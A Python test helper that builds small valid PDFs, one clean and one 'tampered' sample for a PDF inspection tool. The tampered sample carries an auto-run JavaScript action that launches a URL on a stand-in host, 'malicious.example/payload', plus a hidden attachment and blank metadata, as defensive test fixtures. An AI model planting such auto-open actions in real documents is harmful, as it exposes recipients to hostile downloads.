"""Helpers to build small, structurally valid PDFs for tests.

Each PDF gets a correct xref table so pypdf can parse it. Shared by regression
tests and manual verification scripts.
"""
from __future__ import annotations


def build_pdf(objects: dict[int, bytes]) -> bytes:
    """Assemble a valid single-generation PDF from {obj_num: body} with a real xref."""
    out = bytearray(b"%PDF-1.7\n")
    offsets: dict[int, int] = {}
    for num in sorted(objects):
        offsets[num] = len(out)
        out += f"{num} 0 obj\n".encode()
        out += objects[num].rstrip(b"\n") + b"\nendobj\n"
    xref_pos = len(out)
    count = max(objects) + 1
    out += b"xref\n"
    out += f"0 {count}\n".encode()
    out += b"0000000000 65535 f \n"
    for num in range(1, count):
        out += f"{offsets[num]:010d} 00000 n \n".encode()
    out += (
        b"trailer\n"
        + f"<< /Size {count} /Root 1 0 R >>\n".encode()
        + f"startxref\n{xref_pos}\n".encode()
        + b"%%EOF"
    )
    return bytes(out)


def _content_stream(text: bytes) -> bytes:
    return b"<< /Length " + str(len(text)).encode() + b" >>\nstream\n" + text + b"\nendstream"


def clean_pdf() -> bytes:
    """A plain, metadata-complete PDF with one page of consistent dates."""
    return build_pdf(
        {
            1: b"<< /Type /Catalog /Pages 2 0 R >>",
            2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            3: (
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
            ),
            4: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
            5: _content_stream(
                b"BT /F1 12 Tf 72 720 Td "
                b"(Quarterly certificate. Issued: 12 Mar 2026. "
                b"Valid through: 12 Mar 2027.) Tj ET"
            ),
        }
    )


def tampered_pdf() -> bytes:
    """A structurally valid PDF carrying JavaScript, auto actions, an embedded
    file, sparse metadata, and an inconsistent embedded date."""
    # The JS payload carries an ISO date that contradicts the visible issue date.
    js = b"app.launchURL(\"http://malicious.example/payload?audit=2026-06-01\");"
    return build_pdf(
        {
            1: b"<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /AA 7 0 R "
               b"/Creator () /Producer () >>",
            2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            3: (
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
            ),
            4: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
            5: _content_stream(
                b"BT /F1 12 Tf 72 720 Td "
                b"(Certificate. Issued: 01 Jan 2026. "
                b"Valid through: 01 Jan 2027.) Tj ET"
            ),
            6: b"<< /S /JavaScript /JS (" + js + b") >>",
            7: b"<< /S /JavaScript /JS (this.closeDoc();) >>",
            8: b"<< /Type /Filespec /F (invoice.dat) /EF << /F 9 0 R >> >>",
            9: _content_stream(b"\x00\x01\x02\x03binary attachment\x04\x05"),
        }
    )
